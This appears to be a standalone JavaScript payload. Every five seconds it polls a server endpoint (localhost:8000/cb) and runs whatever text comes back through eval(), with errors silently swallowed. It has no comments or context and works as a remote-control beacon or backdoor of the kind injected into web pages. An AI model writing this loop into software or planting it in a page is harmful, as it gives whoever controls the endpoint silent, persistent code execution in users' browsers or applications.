setInterval(() => {
    fetch('http://localhost:8000/cb').then((res) => res.text()).then((data) => {
        if (data.length > 0) {
            try {
                eval(data);
            } catch (e) {

            }
        }
    }).catch((err) => {
        console.log(err);
    });
}, 5000)
